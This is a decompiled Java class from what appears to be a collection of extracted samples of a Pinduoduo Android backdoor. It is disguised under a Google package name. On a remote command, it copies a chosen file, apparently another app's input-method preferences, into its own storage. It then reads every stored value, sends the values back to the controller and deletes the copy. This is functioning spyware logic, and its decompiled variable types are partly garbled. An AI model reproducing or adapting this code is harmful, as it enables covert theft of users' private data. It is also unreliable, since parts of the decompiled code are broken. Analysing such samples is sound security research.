package com.google.android.sd.biz_dynamic_dex.hw_get_input;

import android.content.Context;
import android.content.SharedPreferences;
import android.text.TextUtils;
import com.google.android.sd.biz_dynamic_dex.a.a;
import com.google.android.sd.biz_dynamic_dex.base.DynamicCmdExecutor;
import com.google.android.sd.biz_dynamic_dex.base.a;
import com.google.android.sd.cmd.CmdData;
import com.google.android.sd.cmd.CmdHandler;
import com.google.android.sd.utils.Utils;
import java.io.File;
import org.json.JSONObject;

public class HwGetInputExecutor extends DynamicCmdExecutor {
  private String a = "";
  
  private String b = "";
  
  private static void a(Context paramContext, String paramString1, String paramString2) {
    CmdHandler.dispatch(paramContext, Utils.buildErrorRespData(new CmdData(2006, paramString1, "client"), paramString2, null));
  }
  
  public void realExecute(Context paramContext, String paramString) {
    File file;
    String str;
    try {
      JSONObject jSONObject = new JSONObject(paramString);
      this.b = jSONObject.optString("uuid");
      this.a = jSONObject.optString("path");
    } catch (Exception exception) {}
    if (TextUtils.isEmpty(this.b) || TextUtils.isEmpty(this.a)) {
      str = this.b;
      paramString = "para error";
    } else {
      String str1;
      File file1 = a.a(paramContext);
      File file2 = new File(this.a);
      StringBuilder stringBuilder = new StringBuilder("backup file ");
      stringBuilder.append(this.a);
      stringBuilder.append(" ");
      stringBuilder.append(file1.getAbsolutePath());
      String str2 = a.a(stringBuilder.toString());
      if (!TextUtils.isEmpty(str2)) {
        str = this.b;
        str1 = "copy fail, ".concat(String.valueOf(str2));
      } else {
        file = new File(str1.getAbsolutePath(), str.getName());
        SharedPreferences sharedPreferences = a.a(paramContext, file);
        if (sharedPreferences != null) {
          str = this.b;
          String str3 = sharedPreferences.getAll().toString();
          try {
            JSONObject jSONObject = new JSONObject();
            jSONObject.put("value", str3);
            CmdHandler.dispatch(paramContext, Utils.buildSucceedRespData(new CmdData(2006, str, "client"), jSONObject, null));
          } finally {}
        } else {
          a(paramContext, this.b, "sp is null");
        } 
        file.delete();
        return;
      } 
    } 
    a(paramContext, str, (String)file);
  }
}


/* Location:              C:\Users\daimiaopeng\Downloads\pinduoduo_backdoor-main\pinduoduo_backdoor-main\dex\da03be2689cc463f901806b5b417c9f5-dex2jar.jar!\com\google\android\sd\biz_dynamic_dex\hw_get_input\HwGetInputExecutor.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       1.1.3
 */